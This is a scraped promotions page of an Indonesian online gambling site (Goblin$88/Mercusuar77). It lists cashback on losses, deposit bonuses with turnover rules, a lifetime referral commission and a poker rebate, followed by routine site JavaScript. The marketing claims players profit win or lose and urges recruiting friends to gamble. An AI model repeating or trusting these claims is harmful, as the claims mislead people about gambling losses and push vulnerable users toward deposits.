            <h3><b style="color: rgb(255, 156, 0);">MAIN DI Goblin$88 MENANG KALAH SEMUANYA DAPAT DUIT BOSKU !</b></h3><p><b>Syarat Dan Ketentuan :</b></p><ul><li><b>Bonus cashback dibagikan setiap hari selasa mulai pukul 15.00 s/d pukul 17.00 WIB (Hingga Selesai)</b></li><li><b>Bonus akan dihitung berdasarkan total kekalahan masing masing ID dari hari senin - minggu.</b></li><li><b>Maximal bonus yang diberikan adalah 20.000.000.</b></li><li><b>Bonus akan di berikan berupa kredit yang di proseskan kedalam ID secara otomatis ke masing masing dompet utama member dan bisa langsung di WD kan tanpa syarat.</b></li><li><b>Bonus Cashback hanya berlaku untuk permainan sportsbook dan live casino.</b></li><li><b>Bonus ini tidak bisa digabungkan dengan promo bonus lainnya.</b></li><li><b>Keputusan dan kebijakan pihak Goblin$88 adalah mutlak dan tidak dapat diganggu gugat.</b></li></ul><table class="table table-bordered"><tbody><tr><td style="text-align: center; "><b>TOTAL KEKALAHAN PER MINGGU</b></td><td style="text-align: center; "><b>PERSENTASE CASHBACK YANG DIDAPATKAN</b></td></tr><tr><td style="text-align: center; "><b>2.000.000 - 10.000.000</b></td><td style="text-align: center; "><b>2.5%</b></td></tr><tr><td style="text-align: center; "><b>10.000.000 - 80.000.000</b></td><td style="text-align: center; "><b>5%</b></td></tr><tr><td style="text-align: center; "><b>80.000.000 - 200.000.000</b></td><td style="text-align: center; "><b>7.5%</b></td></tr><tr><td style="text-align: center; "><b>200.000.000 ++</b>&nbsp;</td><td style="text-align: center; "><b>10%</b></td></tr></tbody></table>
          </div>

              </div>
    </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!--END Language Option Modal -->
            <div class="promotion-single" data-filter="ALL,ALL" style="">
      <div class="row d-flex">
      <div class="col-md-4 col-sm-4 col-xs-12 ">
        <img src="/assets/promotion_banners/bonusnew20%.jpg" alt="Goblin$88 promo" class="img-fluid ">
      </div>
      <div class="col-md-8 col-sm-8 col-xs-12 m-t-10">

        <div class="col-md-8 col-sm-8 col-xs-12 text-left">
          <h3 class="title">
                      <div>
            BONUS 20% NEW MEMBER TO KECIL
          </div>
                </h3>
      <div class="m-t-10">
        <a href="javascript:void(0);" class="btn btn-secondary" data-trigger="nifty" data-target="#promo-modal-2634138929">Rincian</a>
        <!--<a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a>   -->
      </div>
        </div>
        <div class="col-md-4 col-sm-4 col-xs-12 m-t-10 time-remaining-wraper">
          <div class="time-remaining">
            <i class="icon-clock"></i> &nbsp; Waktu yang tersisa          </div>
          <div class="time-remaining-value">
            <h4>
                              <span>Tanpa Batas Waktu</span>
                         </h4>
          </div>
        </div>

      </div>
      </div>
  </div>
  <!--Language Option Modal -->
  <div class="nifty-modal slide-in-bottom modal-lg promotion-modal" id="promo-modal-2634138929">
    <div class="md-content">
      <div class="md-head">
          <div class="md-close">X</div>
      </div>
    <div class="promotionmodal_content">

      <div class="md-body">
        <div class="row">

          <div class="col-md-5 col-sm-5 col-xs-12 promobanner_img">
            <img src="/assets/promotion_banners/bonusnew20%.jpg" alt="Goblin$88 promo" class="img-fluid ">
          </div>
          <div class="col-md-7 col-sm-7 col-xs-12">
            <h3 class="title m-t-10">
                          <div>
              BONUS 20% NEW MEMBER TO KECIL
            </div>
                    </h3>
        <div class="time-remaining">
          <i class="icon-clock"></i> &nbsp; Waktu yang tersisa        </div>
        <div class="time-remaining-value">
          <h4>
                        <span>Tanpa Batas Waktu</span>
                     </h4>
        </div>
        <div class="m-t-10">
          <!-- <a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a> -->
        </div>
          </div>

        </div>
                  <div class="m-t-10 ">
            <h3><b style="color: rgb(255, 156, 0);">Goblin$88 MEMBERIKAN BONUS EKSTRA DEPOSIT TAMBAHAN 20% DARI NILAI DEPOSIT KEPADA SELURUH MEMBER YANG BARU BERGABUNG.</b></h3><p><b>Syarat dan ketentuan :</b><br></p><ul><li><b>Bonus hanya berlaku untuk permainan slot online.</b></li><li><b>Minimal deposit untuk mengikuti promo ini adalah 100.000</b></li><li><b>Maksimal Bonus yang diberikan adalah Rp. 50.000</b></li><li><b>Bonus wajib diklaim pada saat melakukan deposit pertama dan akan masuk secara otomatis. (Jika tidak diklaim pada saat deposit maka bonus sudah tidak bisa diambil lagi)</b></li><li><span style="font-weight: bolder;">Pihak Goblin$88 berhak untuk membatalkan bonus atau tidak memberi bonus apabila kedapatan melakukan kecurangan atau melanggar ketentuan yang ada.</span></li><li><b>Semua keputusan dari Goblin$88 bersifat MUTLAK dan tidak dapat di ganggu gugat.</b></li><li><b>Syarat mudah untuk withdraw adalah mencapai turnover kecil yaitu hanya 3x saja.</b></li></ul><p><b>CONTOH :&nbsp;</b><br></p><p><b>Deposit 100.000 Dapat Bonus 20.000 = 120.000</b></p><p><b>Maka berarti total TURNOVER yang harus dicapai adalah 120.000 x 3 = 360.000</b></p><p><br></p>
          </div>

              </div>
    </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!--END Language Option Modal -->
            <div class="promotion-single" data-filter="ALL,ALL" style="">
      <div class="row d-flex">
      <div class="col-md-4 col-sm-4 col-xs-12 ">
        <img src="/assets/promotion_banners/bonusdepositsetiaphari10%.jpg" alt="Goblin$88 promo" class="img-fluid ">
      </div>
      <div class="col-md-8 col-sm-8 col-xs-12 m-t-10">

        <div class="col-md-8 col-sm-8 col-xs-12 text-left">
          <h3 class="title">
                      <div>
            BONUS DEPOSIT 10% SETIAP HARI
          </div>
                </h3>
      <div class="m-t-10">
        <a href="javascript:void(0);" class="btn btn-secondary" data-trigger="nifty" data-target="#promo-modal-2919775902">Rincian</a>
        <!--<a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a>   -->
      </div>
        </div>
        <div class="col-md-4 col-sm-4 col-xs-12 m-t-10 time-remaining-wraper">
          <div class="time-remaining">
            <i class="icon-clock"></i> &nbsp; Waktu yang tersisa          </div>
          <div class="time-remaining-value">
            <h4>
                              <span>Tanpa Batas Waktu</span>
                         </h4>
          </div>
        </div>

      </div>
      </div>
  </div>
  <!--Language Option Modal -->
  <div class="nifty-modal slide-in-bottom modal-lg promotion-modal" id="promo-modal-2919775902">
    <div class="md-content">
      <div class="md-head">
          <div class="md-close">X</div>
      </div>
    <div class="promotionmodal_content">

      <div class="md-body">
        <div class="row">

          <div class="col-md-5 col-sm-5 col-xs-12 promobanner_img">
            <img src="/assets/promotion_banners/bonusdepositsetiaphari10%.jpg" alt="Goblin$88 promo" class="img-fluid ">
          </div>
          <div class="col-md-7 col-sm-7 col-xs-12">
            <h3 class="title m-t-10">
                          <div>
              BONUS DEPOSIT 10% SETIAP HARI
            </div>
                    </h3>
        <div class="time-remaining">
          <i class="icon-clock"></i> &nbsp; Waktu yang tersisa        </div>
        <div class="time-remaining-value">
          <h4>
                        <span>Tanpa Batas Waktu</span>
                     </h4>
        </div>
        <div class="m-t-10">
          <!-- <a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a> -->
        </div>
          </div>

        </div>
                  <div class="m-t-10 ">
            <h3><b style=""><span style="color: rgb(255, 156, 0);">KLAIM ESKTRA BONUS DEPOSIT 10% SETIAP HARI SEBAGAI TAMBAHAN MODAL UNTUK </span><span style="color: rgb(255, 0, 0);">MENANG BESAR</span><span style="color: rgb(255, 156, 0);">&nbsp;</span><span style="color: rgb(255, 0, 0);">!</span></b></h3><h3><span style="font-weight: bold; font-size: 12px;">Syarat Dan Ketentuan&nbsp; :</span><br></h3><ul><li><span style="font-weight: bold;">Promo ini berlaku untuk member setia Mercusuar77.</span></li><li><span style="font-weight: bold;">Bonus berlaku untuk permainan slot online.</span></li><li><span style="font-weight: bold;">Minimal deposit Rp 100.000,-</span></li><li><span style="font-weight: bold;">Maximal bonus diberikan Rp. 50.000,-</span></li><li><span style="font-weight: bold;">Bonus di klaim langsung setelah mengisi form Setor Dana dengan memilih Bonus Deposit 10% Setiap Hari.</span></li><li><span style="font-weight: bold;">Promo bonus ini tidak dapat digabungkan dengan promo bonus Goblin$88 lainnya.</span></li><li><span style="font-weight: bold;">Bonus harus di klaim setelah melakukan deposit dan sebelum saldo dimainkan.</span></li><li><span style="font-weight: bold;">Semua keputusan serta kebijakan dari pihak Goblin$88 bersifat mutlak dan tidak dapat diganggu gugat.<br></span></li><li><span style="font-weight: bold;">Syarat mudah withdraw untuk promo ini yaitu sebesar 8X dari nilai Deposit + Extra Bonus Deposit 10%&nbsp;</span></li><li><span style="font-weight: bolder;">Tidak diperkenankan untuk klaim bonus jika memiliki kesamaan IP dengan ID lainnya (Apabila terdeteksi sistem maka seluruh saldo didalam ID akan ditarik / kemenangan tidak sah)</span></li></ul><p><span style="font-weight: bold;">Contoh : Deposit 100.000 + Extra Bonus 10% [IDR 10.000] X 8 = Nilai Turnover 880.000<br></span></p><p><span style="font-weight: bold;">(Batas waktu memenuhi syarat Turnover yaitu selama 7 hari)</span><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p>
          </div>

              </div>
    </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!--END Language Option Modal -->
            <div class="promotion-single" data-filter="ALL,ALL" style="">
      <div class="row d-flex">
      <div class="col-md-4 col-sm-4 col-xs-12 ">
        <img src="/assets/promotion_banners/bonusreferal1.png" alt="Goblin$88 promo" class="img-fluid ">
      </div>
      <div class="col-md-8 col-sm-8 col-xs-12 m-t-10">

        <div class="col-md-8 col-sm-8 col-xs-12 text-left">
          <h3 class="title">
                      <div>
            BONUS REFERRAL 1% SEUMUR HIDUP TANPA BATAS
          </div>
                </h3>
      <div class="m-t-10">
        <a href="javascript:void(0);" class="btn btn-secondary" data-trigger="nifty" data-target="#promo-modal-3657310869">Rincian</a>
        <!--<a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a>   -->
      </div>
        </div>
        <div class="col-md-4 col-sm-4 col-xs-12 m-t-10 time-remaining-wraper">
          <div class="time-remaining">
            <i class="icon-clock"></i> &nbsp; Waktu yang tersisa          </div>
          <div class="time-remaining-value">
            <h4>
                              <span>Tanpa Batas Waktu</span>
                         </h4>
          </div>
        </div>

      </div>
      </div>
  </div>
  <!--Language Option Modal -->
  <div class="nifty-modal slide-in-bottom modal-lg promotion-modal" id="promo-modal-3657310869">
    <div class="md-content">
      <div class="md-head">
          <div class="md-close">X</div>
      </div>
    <div class="promotionmodal_content">

      <div class="md-body">
        <div class="row">

          <div class="col-md-5 col-sm-5 col-xs-12 promobanner_img">
            <img src="/assets/promotion_banners/bonusreferal1.png" alt="Goblin$88 promo" class="img-fluid ">
          </div>
          <div class="col-md-7 col-sm-7 col-xs-12">
            <h3 class="title m-t-10">
                          <div>
              BONUS REFERRAL 1% SEUMUR HIDUP TANPA BATAS
            </div>
                    </h3>
        <div class="time-remaining">
          <i class="icon-clock"></i> &nbsp; Waktu yang tersisa        </div>
        <div class="time-remaining-value">
          <h4>
                        <span>Tanpa Batas Waktu</span>
                     </h4>
        </div>
        <div class="m-t-10">
          <!-- <a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a> -->
        </div>
          </div>

        </div>
                  <div class="m-t-10 ">
            <h3><b style="color: rgb(255, 156, 0);">INGIN CARI CUAN TANPA MODAL ? AJAK TEMAN BERMAIN DI Goblin$88 DAN DAPATKAN KOMISI SEBESAR 1% SELAMA SEUMUR HIDUP.</b></h3><p><span style="font-weight: bold;">Syarat dan Ketentuan :</span></p><ul><li><span style="font-weight: bold;">Copy link daftar referal yang tersedia pada menu REFERRAL didalam akun Goblin$88 lalu diberikan kepada teman teman yang ingin bermain di Mercusuar77.</span></li><li><span style="font-weight: bold;">Setiap 1 player yang diajak maka berhak untuk mendapatkan 1% komisi dari total turnover player tersebut.</span></li><li><span style="font-weight: bold;">Semakin banyak teman yang anda ajak bermain menggunakan refferal anda, otomatis bonus anda juga akan semakin banyak tentunya.</span></li><li><span style="font-weight: bold;">Bahkan jika anda bukan seorang petaruh online, namun memiliki kalangan / komunitas petaruh online, anda dapat mendaftarkan akun anda pada situs kami, dan mengajak kalangan / komunitas petaruh online anda untuk bermain disitus kami dengan menggunakan refferal anda.</span></li><li><span style="font-weight: bold;">Bonus referal akan dihitung setiap 1 bulan sekali dan akan di bagikan pada setiap tanggal 5 pada pukul 15:00 - 17:00 WIB</span></li><li><span style="font-weight: bold;">Untuk Bonus referral akan langsung otomatis di proseskan ke dalam Dompet Utama.</span></li><li><span style="font-weight: bold;">Untuk bonus refferal yang didapatkan dapat ditarik / WD kapan saja tanpa syarat</span></li></ul>
          </div>

              </div>
    </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!--END Language Option Modal -->
            <div class="promotion-single" data-filter="ALL,ALL" style="">
      <div class="row d-flex">
      <div class="col-md-4 col-sm-4 col-xs-12 ">
        <img src="/assets/promotion_banners/rolingpoker.jpg" alt="Goblin$88 promo" class="img-fluid ">
      </div>
      <div class="col-md-8 col-sm-8 col-xs-12 m-t-10">

        <div class="col-md-8 col-sm-8 col-xs-12 text-left">
          <h3 class="title">
                      <div>
            BONUS ROLLINGAN TURNOVER POKER 0.3% SETIAP HARI
          </div>
                </h3>
      <div class="m-t-10">
        <a href="javascript:void(0);" class="btn btn-secondary" data-trigger="nifty" data-target="#promo-modal-1989003421">Rincian</a>
        <!--<a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a>   -->
      </div>
        </div>
        <div class="col-md-4 col-sm-4 col-xs-12 m-t-10 time-remaining-wraper">
          <div class="time-remaining">
            <i class="icon-clock"></i> &nbsp; Waktu yang tersisa          </div>
          <div class="time-remaining-value">
            <h4>
                              <span>Tanpa Batas Waktu</span>
                         </h4>
          </div>
        </div>

      </div>
      </div>
  </div>
  <!--Language Option Modal -->
  <div class="nifty-modal slide-in-bottom modal-lg promotion-modal" id="promo-modal-1989003421">
    <div class="md-content">
      <div class="md-head">
          <div class="md-close">X</div>
      </div>
    <div class="promotionmodal_content">

      <div class="md-body">
        <div class="row">

          <div class="col-md-5 col-sm-5 col-xs-12 promobanner_img">
            <img src="/assets/promotion_banners/roling1%.jpg" alt="Goblin$88 promo" class="img-fluid ">
          </div>
          <div class="col-md-7 col-sm-7 col-xs-12">
            <h3 class="title m-t-10">
                          <div>
              BONUS ROLLINGAN TURNOVER POKER 0.3% SETIAP HARI
            </div>
                    </h3>
        <div class="time-remaining">
          <i class="icon-clock"></i> &nbsp; Waktu yang tersisa        </div>
        <div class="time-remaining-value">
          <h4>
                        <span>Tanpa Batas Waktu</span>
                     </h4>
        </div>
        <div class="m-t-10">
          <!-- <a href="$applynow_url" class="btn btn-primary">__lang('::lang.Apply Now')</a> -->
        </div>
          </div>

        </div>
                  <div class="m-t-10 ">
            <h3><b style="color: rgb(255, 156, 0);">BONUS ROLLINGAN SEBESAR 0.3% SETIAP HARI KEPADA SELURUH PEMAIN POKER YANG BERMAIN DI Mercusuar77</b></h3><p><span style="font-weight: bold;">Syarat dan ketentuan :<br></span></p><ul><li><span style="font-weight: bold;">Promo ini khusus untuk provider 1G</span></li><li><span style="font-weight: bold;">Bonus diberikan setiap hari mulai setelah pukul 14:00 WIB.</span></li><li><span style="font-weight: bold;">Bonus otomatis masuk ke dompet utama anda berupa kredit dan dapat langsung di withdraw tanpa syarat.</span></li><li><span style="font-weight: bold;">Bonus dihitung dari nilai Valid Betting Amount (VBA)</span></li><li><span style="font-weight: bold;">Bonus rollingan ini akan kami hitung dari jumlah turnover selama periode per 1 hari dihitung mulai tanggal kemarin pukul 11.00 WIB - 10:59 WIB tanggal keesokannya.</span></li><li><span style="font-weight: bold;">Tidak ada batas minimal turnover untuk mendapatkan bonus turnover mingguan Mercusuar77.</span></li><li><span style="font-weight: bold;">Besaran Bonus Rollingan harian dibagikan sesuai dengan kategori level ID anda.</span></li><li><span style="font-weight: bold;">Goblin$88 berhak untuk membatalkan bonus apabila ditemukan indikasi kecurangan atau penipuan yang terjadi.</span></li><li><span style="font-weight: bold;">Keputusan Goblin$88 adalah mutlak dan tidak dapat diganggu gugat.</span></li></ul><div><br></div>
          </div>

              </div>
    </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!--END Language Option Modal -->
    
</div>
</div>
<script>
    $(document).ready(function () {
              const promoId = "";
              if(promoId) {
                const modalList = $(`#promo-modal-${promoId}`);
                if(modalList.length > 0) {
                  const first = modalList.first()
                  first.nifty('show')

                  first.on("hide.nifty.modal", function() {
                    const url = new URL(window.location.href);
                    const params = new URLSearchParams(url.search);
                    params.delete("id");
                    url.search = params.toString();
                    window.history.replaceState({}, '', url.toString());
                  })
                }
              }

              function filterGameBoxes(self){
                $('.g_category-nav .nav-item').removeClass('active');
                        $(self).addClass('active');
                        var filterType= $(self).data('filter');
                        $('.promotion-page .promotion-single').hide();
                        $('.promotion-page .promotion-single').filter(function(){
                        return $(this).data("filter").indexOf(filterType)>=0;
                        }).show();
                    }
                  //Default to ALL Games :
                  filterGameBoxes($('.g_category-nav .nav-item[data-filter=ALL]')[0]);
                  //Add filter btn event listen
                  $('.g_category-nav .nav-item[data-filter]').click(function(){
                    filterGameBoxes(this);
                  });
            });
</script>
    </div>
</div>

                    <div class="mobilesite-footer">  
          <div class="container">
              <style media="screen">
.left-custom-livechat-code{
  bottom: 58px !important;
}
#chat-widget-container{
  bottom: 51px !important;
}
</style>
<div class="menu-bottom">
    <nav class="navbar-inverse navbar-fixed-bottom">
        <div class=" ">
                        <div class="flex-row  text-center">
                <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/home.php?i=1#"><i class="icon-home"></i><div>HOME</div></a>
                </div>
                

                                
                                  <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/promosaya.php"><i class="icon-gift"></i> <div style="text-transform:uppercase;">Promo saya</div></a>
                  </div>
                
                <div class=" footericon-single">
                    <a href="javascript:void(0);" class="text-uppercase togglemenu-trigger footer-funds" data-showid="#fundshover_menu"><i class="icon-transfer"></i> <div>Dana</div></a>
                    <ul class="list-inline horizontal-hover togglemenu-content" id="fundshover_menu">
                      <li>
                        <a href="https://www.Goblin88.site/deposit.php" (click)="closeNav($event);">
                            <div class="fs-sm mt-1" i18n="">Deposit</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/withdraw.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="">Withdraw</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/history.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
                        </a>
                      </li>
                    </ul>
                </div>
                                                <div class=" footericon-single">
                    <a href="https://www.Goblin88.site/memo.php" style="position:relative;"><i class="icon-mail_outline"></i> <div>MEMO</div>
                      
                            <div class="mail_icon" style="display:none;">0</div>
                        
                    </a>
                </div>
                
<div class=" footericon-single" style="position: relative">
    <a href="javascript:void(0)" class="text-uppercase togglemenu-trigger" data-showid="#livechathover_menu"><i class="icon-chat1"></i><div>LIVE CHAT</div></a>
    <ul class="list-inline vertical-hover togglemenu-content text-center" id="livechathover_menu">
        <li>
            <!-- 👇 Link statis diganti pakai variabel PHP $linkLiveChat, dan script JS dihapus -->
            <a href="javascript:void(0)" id="livechat-btn" onclick="openLiveChat('https://direct.lc.chat/19926541/' , '')">
                <i class="icon-chat1"></i>
            </a>
        </li>
                                                              
        <li>
            <a href="https://api.whatsapp.com/send?phone=081318111340" target="_blank "><i class="icon-whatsapp"></i></a>
        </li>                          
                                                   
        <li>
            <a href="https://telegram.me/BABYBOSSQOFFICIAL" target="_blank "><i class="icon-telegram"></i></a>
        </li>
    </ul>
</div>
            </div>
        </div>
    </nav>
</div>



<script type="text/javascript">
    $(".togglemenu-trigger").click(function(){
      var currentToggle = $(this).attr("data-showID");
      if($(currentToggle).hasClass("show")){
        $(currentToggle).removeClass("show");
      }
      else{
        $(".togglemenu-content").removeClass("show");
        $(currentToggle).addClass("show");
      }

    });
</script>
            </div>
            </div>
                  </div>
      </div>
      <div id="r-side-bar"> 
    <div class="side-bar-content container"> 
            </div> 
</div> 
 



    </div>
  </div>


  <!--loading modal -->
  <div class="nifty-modal fade-in-scale" id="loading--layout" style="z-index:1000001;" data-isnotcloseoverlay="true">
    <div class="md-content">
      <div class="md-body">

        <div class="loader-b large"></div>
      </div>
    </div>
  </div>
  <div class="md-overlay" style="z-index:1000000;"></div>
  <!--END loading modal -->

  <!-- APK download ||Transfer Wallet  modal start-->
  <div class="nifty-modal slide-in-bottom downloadapk-modal" id="apk-modal">
  			<div class="md-content">
          <div class="modal-header">
       <button class="pull-right md-close"><i class="icon-x fs-lg"></i></button>
      <h3 id="downloadgame-title"></h3>
    </div>
  				<div class="md-body">
           <!--region Transfer Wallet Menu -->
            <div class="row no-gutters" id="trans_to_game_menu__game-modal">
                <form action="" method="post" id="tw_transfer_form" class="tw_transfer_form" novalidate="novalidate">
                  <input type="hidden" name="_token" value="nYcxQ5bccYYYHwvRt0UKHCESvj7vesmgBe2suyKK">                    <div class="form-group">
                        <label for="mainwallet_amount">From Main Wallet</label>
                        <input type="text" class="form-control" readonly="" name="mainwallet_amount" id="mainwallet_amount" value="188.67">

                    </div>
                    <div class="text-center">
                      <span class="vertical"><i class="icon-arrow-long-right"></i></span>
                    </div>
                    <div class="row">
                      <div class="col-xs-12">
                        <label for="mainwallet_amount">Transfer to <span id="gamename"></span> Wallet</label>
                        <div class="form-group">

                          <div class="customrange-slider">
                            <div id="slider" overflow-scroll="false" class="ui-slider ui-corner-all ui-slider-horizontal ui-widget ui-widget-content">
                              <span tabindex="0" class="ui-slider-handle ui-corner-all ui-state-default" style="left: 0%;"></span>
                              <div class="ui-slider-range ui-corner-all ui-widget-header ui-slider-range-min" style="width: 0%;"></div>
                            </div>
                            <div class="decrease-btn cusbtn">
                              <div id="tw_decrease_btn"> <span class="minus-icon custom-icon">-</span> </div>

                              <div class="minmax-label">Min</div>
                              <div class="minmax-value">
                              5000
                              </div>
                              <input type="hidden" name="twminval" id="twminval" value="5000">
                            </div>
                            <div class="increase-btn cusbtn">
                              <div id="tw_increase_btn">
                                <span class="plus-icon custom-icon">+</span>
                              </div>

                              <div class="minmax-label">Max</div>
                              <div class="minmax-value" id="maxSliderApk">188.67</div>
                            </div>
                          </div>
                        </div>
                          <div class="col-md-8 col-md-offset-2 col-sm-8 col-sm-offset-2 col-xs-8 col-xs-offset-2">
                        <div class="form-group">
                            <input type="text" readonly="" class="form-control" name="transfer_amount" id="transfer_amount" placeholder="0.00" value="00.00" required="">
                        </div>
                        </div>
                      </div>
                    </div>
                    <div class="text-center">
                        <input type="submit" class="btn btn-primary" value="SUBMIT">
                    </div>
                </form>
            </div>
          <!--endregion Transfer Wallet Menu -->

  					<div class="row no-gutters">
  							<div class="col-xs-12 text-center">
  								<a href="#" id="launchurl" class="url-link" target="_blank">
                	<img class="img-fluid" src="/assets/images/log_html5.png" alt="play-in-browser">
  								<div class="download-caption text-center">
  										Play now in your browser
  								</div>
  								<div class="download-linkbtn text-center">
  									<img class="img-fluid" src="/assets/images/btn_playnow.png" alt="play-now-in-browser">
  								</div>
  							</a>
  							</div>
  						</div>
    				</div>
  			</div>
  </div>
  <div class="modal-wrapper nifty-modal fade-in-scale" id="live-draw-modal" data-isnotcloseoverlay="true">
    <div class="md-content"> 
      <div class="md-body"> 
        <div class="modal-header">
        <h4 class="modal-title">Live Draw</h4>      
        <button class="btn btn-link pull-left " id="btn-close--live-draw-modal"> <i class="icon icon-close"></i> </button>
</div>

<div class="modal-body">
    <div id="live_draw_table">
   
    </div>
    <div id="img_details">
        <img src="" class="draw_img" id="draw_img">
        <div class="details">

            <p class="tickte_id">undian berikutnya: <span id="ticket_id"></span></p>
        </div>

        <div class="close_btn_section">
            <button class="btn btn-close" id="img--section-closebtn" onclick="closeImageSection()">Kembali</button>
        </div>
    </div>
    
</div>
      </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!-- APK download modal end-->


  <!--<script src="/js/sweetalert.js"></script>  -->


  <script type="text/javascript">

    $(document).ready(function(){
        $( "#mainContentContainer" ).click(function() {
          $( "#sideNav" ).removeClass( "navContentOpen" );
          $( "#sideNav" ).removeClass( "open" );
          $( "#mainContent" ).removeClass( "navContentOpen" );
          $( "#mainContent" ).removeClass( "sideNavOpen" );
          $( "#mainContent" ).removeClass( "rightSideBarOpen" );
          $( "#r-side-bar" ).removeClass( "open" );
        });

        //this is mobile version of btn close login modal
         $(document).on('click', '#btn-close--login-modal',function(event){
              event.preventDefault();
              event.stopPropagation();
              $('#r-side-bar').removeClass('open');
              $( "#mainContent" ).removeClass( "rightSideBarOpen" );
              return false;

        });

        $(document).on('click','.btn-collapse-balances', function(){
          if( !$('#other-game-bals').is(':visible')){
            $('#other-game-bals').slideDown();
            window.getAllGameBal();
          }
          else{
            $('#other-game-bals').slideUp();
          }
          return false;
        });
      });

  </script>

  <script>
    

    
   
    window.loadOrRefreshTurnstileWidget= function(  selectorId ){

         //do nothing;
    }
     
</script>
    <script type="text/javascript" src="/assets/js/jquery-validation/jquery.validate.min.js"></script>
    <script type="text/javascript" src="/assets/js/jquery-validation/additional-methods.min.js"></script>
    <link rel="stylesheet" href="/assets/js/fancybox/jquery.fancybox.min.css">


    <script type="text/javascript" src="/assets/js/fancybox/jquery.fancybox.min.js"></script>
<script>
 
        window.isAuth=  true  ? true : false;
        window.onLogOut = async function(){
            if(window.iFirebase){
                await window.iFirebase.logout();
            }
            
            window.location.href="https://www.Goblin88.site/logout.php";

        }
        window.fbs =  {"apiKey":"AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw","authDomain":"api-kixplay-live1.firebaseapp.com","projectId":"api-kixplay-live1","storageBucket":"api-kixplay-live1.firebasestorage.app","messagingSenderId":"892534263551","appId":"1:892534263551:web:8c9f262c8a457b082146ca","measurementId":null} ;
        window.firebasSuccessCb = function (params){
        window.json_post(
                "/authViaIdp",
                params ,
                "json",
                showLoadingImgFn   ,
                 removeLoadingImgFn    ,
            ).done(function(d){
    
             window.onLoginCallback(d,true);

            });
        }
    

         window.currencyCode='IDR';
         window.lang="id";
         window.agentCode='Mercusuar77';
         window.sweetAlert= function ( msg , type , title  ,showCancelBtn   ) {
            //check CF error
            var dateNow = "2026-02-25 03:48:34";

            if (msg.indexOf('cloudflare') >= 0) {
                msg = transMsgs.cfTimeout + ' (error time: ' + dateNow + ')';
                title = " ";
            }
            if (msg.indexOf('challenge') >= 0) {
                msg = transMsgs.cfChallenge + ' (error time: ' + dateNow + ')';
                title = " ";
            }
             return     Swal.fire({
                    title: !title? "Warning" : title,
                    text: msg,
                    icon: !type? "error":type,
                    showCancelButton :(showCancelBtn ? true:false),
                    cancelButtonText : "Cancel",
                    showConfirmButton : true, 
                    confirmButtonText : 'OK', 
                } );
            }
            console.log('window.name ' + window.name );
            window.name = !window.name? "parent"  + Date.now() + Math.floor(Math.random() * 100000000) : window.name;
            console.log('window.name ' + window.name );
           window.formatNumber = function (n)   {
                // format number 1000000 to 1,234,567
                return n.replace(/[^0-9\-]/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ",")
            }
            window.convertToNumber= function (value) {

                    if (!value) {
                        return 0;
                    }
                    if(value.indexOf(".") >= 0){
                        var decimal_pos = value.indexOf(".");
                        value= value.substring(0, decimal_pos);

                    }
                    var number =value.replace(/[^0-9.-]+/g, "");
                    if (isNaN(number)) {
                        number = 0;
                    }
                return number;
           }

            window.formatCurrency = function (value) {
                    const symbol = "";//"$"
                    // get input value
                    var input_val = value;

                    if (typeof value !== 'string') {
                        var input_val = value.toString();
                    }
                    if (input_val === "") { return; }

                    var original_len = input_val.length;


                    if (input_val.indexOf(".") >= 0) {

                        var decimal_pos = input_val.indexOf(".");
                        var left_side = input_val.substring(0, decimal_pos);
                        var right_side = input_val.substring(decimal_pos+1);

                        left_side = formatNumber(left_side);

                        right_side += "00";

                        right_side = right_side.substring(0, 2);

                        input_val = symbol + left_side + "." + right_side;

                    } else {
                        input_val = formatNumber(input_val);
                        input_val = symbol + input_val + ".00";;

                    }

                    return input_val;
           }

                window.prize = 0 ;
                window.ajax_jackpot= function  () {
                    $.ajax({
                        url: "https://www.Goblin88.site/getPokerJackpotAmt",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (data) {
                            prize = (data / 2000.000)*2000.000;
                            $('.jackpot_numbers_home').html(`IDR <span id="jackpot_amount">${ commaSeparateNumber(prize) }</span>`)

                            //$('.jackpot_numbers_home').html(`IDR ` + commaSeparateNumber(data.prize));
                        }
                    });
                }
                window.getHkbLotteryResults= function  (callback) {
                    var results = [];
                    $.ajax({
                        url: "https://www.Goblin88.site/getHKBLotteryResults",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (result) {
                            results =  result.data.hkb_lottery_results;
                            if (typeof callback === 'function') {
                                callback(results);
                            }
                        }
                    });
                   
                }

                var newI = 0;
                window.popitup = function  (url,gameid) {
                  //alert(gameid);
                    newwindow = window.open(url,  window.agentCode + '_gameWindow'+gameid+newI,'toolbar=0,width=1200,height=750');
                    newI++;
                    if (window.focus) { newwindow.focus() }
                    return false;
                }

                window.popup = function (mylink, windowname) {
                    if (!window.focus) return true;
                    var href;
                    if (typeof (mylink) == 'string')
                        href = mylink;
                    else
                        href = mylink.href;
                    window.open(href, windowname, 'width=600,height=800,scrollbars=yes');
                    return false;
                }
                window.commaSeparateNumber = function (val, isJP) {
                    while (/(\d+)(\d{3})/.test(val.toString())) {

                        if( window.currencyCode=='VND' && isJP){
                            val = val.toFixed(0);
                        }else {
                            val = Number(val).toFixed(2);
                        }
